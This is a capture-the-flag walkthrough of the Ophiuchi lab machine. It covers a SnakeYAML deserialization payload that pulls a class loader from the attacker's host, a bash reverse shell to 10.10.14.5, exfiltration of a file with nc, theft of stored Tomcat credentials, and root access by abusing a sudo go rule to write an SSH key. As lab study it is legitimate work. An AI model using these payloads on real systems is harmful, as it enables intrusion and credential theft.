# Scan

```bash
ghost@localhost [13:11:07] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.227:22
Open 10.10.10.227:8080

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6dfc68e2da5e80dfbcd045f529db04ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0=
|   256 7ac9837e13cbc3f9591e5321ab1976ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs=
|   256 176bc3a8fc5d3608a14089d2f40ac646 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
8080/tcp open  http    syn-ack Apache Tomcat 9.0.38
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 8080

Looks like the input form at homepage is not working properly. Running feroxbuster gives some interesting urls. Also from the error redirects `/Servlet` which means the server is running Java, and `/manager` is tomcat configuration. From nmap, we can see it is running `Tomcat 9.0.38`.

```bash
ghost@localhost [13:58:58] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % feroxbuster -u http://10.10.10.227:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k

200      GET      297l      587w     8042c http://10.10.10.227:8080/
302      GET        0l        0w        0c http://10.10.10.227:8080/test => /test/
302      GET        0l        0w        0c http://10.10.10.227:8080/manager => /manager/
302      GET        0l        0w        0c http://10.10.10.227:8080/manager/images => /manager/images/
302      GET        0l        0w        0c http://10.10.10.227:8080/manager/css => /manager/css/
401      GET       63l      291w     2499c http://10.10.10.227:8080/manager/html
302      GET        0l        0w        0c http://10.10.10.227:8080/manager/ => /manager/html
401      GET       63l      291w     2499c http://10.10.10.227:8080/manager/text
401      GET       63l      291w     2499c http://10.10.10.227:8080/manager/status
302      GET        0l        0w        0c http://10.10.10.227:8080/yaml => /yaml/
302      GET        0l        0w        0c http://10.10.10.227:8080/yaml/test => /yaml/test/
200      GET      297l      587w     8042c http://10.10.10.227:8080/yaml/
[####################] - 4m    387072/387072  0s      found:12      errors:76
[####################] - 3m     43008/43008   182/s   http://10.10.10.227:8080
[####################] - 3m     43008/43008   183/s   http://10.10.10.227:8080/
[####################] - 3m     43008/43008   182/s   http://10.10.10.227:8080/test
[####################] - 4m     43008/43008   178/s   http://10.10.10.227:8080/manager
[####################] - 3m     43008/43008   179/s   http://10.10.10.227:8080/manager/images
[####################] - 4m     43008/43008   178/s   http://10.10.10.227:8080/manager/css
[####################] - 3m     43008/43008   181/s   http://10.10.10.227:8080/yaml
[####################] - 3m     43008/43008   182/s   http://10.10.10.227:8080/yaml/test
[####################] - 3m     43008/43008   182/s   http://10.10.10.227:8080/yaml/
```

The text input form in homepage can crash the server (500) by entering a single quote. From the error, we can see that it is using `snakeyaml`.

Using the exploit from [this medium article](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858), I managed to run RCE on the input.

This [blog post from GitHub](https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/) is also good read.

```java
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://10.10.14.5"]  
  ]]  
]
```

I received HTTP request here.

```bash
ghost@localhost [23:13:44] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [02/Nov/2022 23:13:49] "GET / HTTP/1.1" 200 -
```

So I will be using this exploit (https://github.com/artsploit/yaml-payload). I split into 2 `.jar` packages because downloading and executing together does not seems to be working.

First one is `load.jar` which will download `shell.sh` to `/tmp/shell.sh`. Another one is `exec.jar` which will execute the `/tmp.shell.sh`.

```java
...
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
```


Then in `shell.sh` I wrote the following reverse shell payload.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

Once executed the exploits, I managed to get back a reverse shell.

```bash
ghost@localhost [23:27:09] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.227] 34806
bash: cannot set terminal process group (765): Inappropriate ioctl for device
bash: no job control in this shell

tomcat@ophiuchi:/$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

From `/opt/tomcat/conf/tomcat-users.xml` I found the admin credential.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
        version="1.0">
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

Under `/home` I found a user `admin`.

```bash
tomcat@ophiuchi:~/conf$ ls /home
admin
```

I tried SSH logging in with the credential (to see if there's a password reuse) and managed to get access to `admin` user.

```bash
ghost@localhost [23:57:42] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % ssh admin@10.10.10.227

admin@ophiuchi:~$
```


# User

```bash
admin@ophiuchi:~$ cat user.txt
ae30cecfd3f2ee2a35eaea09e4c8f213
```


# Privilege escalation

Checking `sudo -l` I found that the user `admin` can run `go` on `/opt/wasm-functions/index.go`.

```bash
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

The content of the go code is

```go
package main

import (
    "fmt"
    wasm "github.com/wasmerio/wasmer-go/wasmer"
    "os/exec"
    "log"
)


func main() {
    bytes, _ := wasm.ReadBytes("main.wasm")

    instance, _ := wasm.NewInstance(bytes)
    defer instance.Close()
    init := instance.Exports["info"]
    result,_ := init()
    f := result.String()
    
    if (f != "1") {
        fmt.Println("Not ready to deploy")
    } else {
        fmt.Println("Ready to deploy")
        out, err := exec.Command("/bin/sh", "deploy.sh").Output()
        if err != nil {
            log.Fatal(err)
        }
        fmt.Println(string(out))
    }
}
```

I checked if any file is especially `deploy.sh` or `index.go` is writable in the folder. It seems that all of them are readable only not writable.

```bash
admin@ophiuchi:~$ find /opt/wasm-functions -type f -writable -ls 2>/dev/null

admin@ophiuchi:~$ find /opt/wasm-functions -type f -readable -ls 2>/dev/null
  1322036   2460 -rwxr-xr-x   1 root     root      2516736 Oct 14  2020 /opt/wasm-functions/index
  1321998      4 -rw-rw-r--   1 root     root          522 Oct 14  2020 /opt/wasm-functions/index.go
  1057205      4 -rw-r--r--   1 root     root           88 Oct 14  2020 /opt/wasm-functions/deploy.sh
  1322001   1448 -rwxrwxr-x   1 root     root      1479371 Oct 14  2020 /opt/wasm-functions/main.wasm
  1057210      4 -rw-r--r--   1 root     root          522 Oct 14  2020 /opt/wasm-functions/backup/index.go
  1057206      4 -rw-r--r--   1 root     root           88 Oct 14  2020 /opt/wasm-functions/backup/deploy.sh
  1057211   1448 -rwxr-xr-x   1 root     root      1479371 Oct 14  2020 /opt/wasm-functions/backup/main.wasm
```

I appears I cannot execute the script outside `/opt/wasm-functions`

```bash
admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
panic: runtime error: index out of range [0] with length 0

goroutine 1 [running]:
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports.func1(0x0, 0x0, 0xc000045c90, 0x5d1200, 0x200000003)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:94 +0x201
github.com/wasmerio/wasmer-go/wasmer.newInstanceWithImports(0xc00000e060, 0xc000045d48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc000045d70)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:137 +0x1d3
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports(0x0, 0x0, 0x0, 0xc00000e060, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, ...)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:87 +0xa6
github.com/wasmerio/wasmer-go/wasmer.NewInstance(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, 0x1)
        /root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:82 +0xc9
main.main()
        /opt/wasm-functions/index.go:14 +0x6d
exit status 2


admin@ophiuchi:~$ cd /opt/wasm-functions


admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

I first downloaded the `main.wasm` to local, and de-compile it online.

```bash
admin@ophiuchi:~$ cat main.wasm | nc 10.10.14.5 9001


ghost@localhost [00:21:03] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % nc -lvnp 9001 > main.wasm
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.227] 44176
```

https://webassembly.github.io/wabt/demo/wasm2wat/

```wat
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

So in go code, if the function output is not equal to `1` it will shows `not ready to deploy`. So if it is `1` means it will execute `deploy.sh`.

So I modified the code as below and compile back to `wasm` with the following website.

```bash
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 1))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

Then uploaded back to the target machine at `/home/admin` and also wrote `deploy.sh` script under the same directory. It can execute any shell as shown below.

```bash
admin@ophiuchi:~$ echo "whoami" > deploy.sh

admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
root
```

So this time I checked if I there's `.ssh` directory and if it does, wrote a curl command to put my public key under `/root/.ssh/authorized_keys`.

```bash
admin@ophiuchi:~$ echo "ls /root/.ssh" > deploy.sh
admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
authorized_keys


admin@ophiuchi:~$ echo "curl 10.10.14.5/ghost.pub -o /root/.ssh/authorized_keys" > deploy.sh
admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```

I can see the curl request has been made on my Python server.

```bash
ghost@localhost [00:42:24] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [03/Nov/2022 00:43:27] "GET /modified.wasm HTTP/1.1" 200 -
10.10.10.227 - - [03/Nov/2022 00:49:38] "GET /ghost.pub HTTP/1.1" 200 -
```

Now I can just ssh as root.

```bash
ghost@localhost [00:50:26] [~/Documents/hacking/tj-null-boxes/ophiuchi] [master *]
-> % ssh root@10.10.10.227 -i ghost

root@ophiuchi:~# cat root.txt
eda76855ec018f420a17827d1bd5397b
```
